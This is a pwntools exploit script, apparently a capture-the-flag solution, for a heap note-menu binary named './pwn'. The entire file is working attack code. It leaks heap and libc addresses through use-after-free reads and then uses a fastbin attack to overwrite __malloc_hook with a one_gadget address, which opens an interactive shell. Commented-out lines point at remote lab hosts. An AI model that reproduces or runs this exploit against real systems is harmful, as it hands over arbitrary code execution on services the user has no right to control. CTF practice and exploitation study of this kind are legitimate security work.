from pwn import *

#context.log_level = 'debug'

sh=process('./pwn')
#sh=remote('')#('85c3e0fcae5e972af313488de60e8a5a.kr-lab.com','58512')#('111.198.29.45','32440')
elf = ELF('./pwn')

def show(idx):
	sh.sendlineafter('> ','2')
	sh.sendlineafter('index: ',str(idx))
def new(con):
	sh.sendlineafter('> ','1')
	sh.sendlineafter('data:\n',con)

def edit(idx,con):
        sh.sendlineafter('> ','3')
        sh.sendlineafter('index: ',str(idx))
        sh.sendline(con)

def dele(idx):
        sh.sendlineafter('> ','4')
        sh.sendlineafter('index: ',str(idx))

new('a'*8)
new('a'*8)
new('b'*8)
new('c'*0x80)
new('c'*0x80)
new('d'*0x60)
new('d'*0x60)

new('e'*0x20)

#----------------leak heap base------------------------------
dele(2)
dele(0)
show(1)
heap = u64(sh.recvuntil('\n',drop=True).ljust(8,'\x00'))-0x60
print hex(heap)

new('d'*8)
new('a'*8)
#---------------leak libc base-----------------------------
dele(3)
show(4)

libc = u64(sh.recvuntil('\n',drop=True).ljust(8,'\x00'))-88-0x3c4b20
print hex(libc)
one = libc+0x4526a
print hex(one)

new('c'*0x80)

#------------------hjack malloc_hook to getshell-----------
dele(5)
edit(6,p64(libc+0x3c4b20-0x33))
new('d'*0x60)
new('a'*0x13+p64(one)+p64(0)*9)

sh.sendlineafter('> ','1')
sh.sendline('end')

#gdb.attach(sh)

sh.interactive()
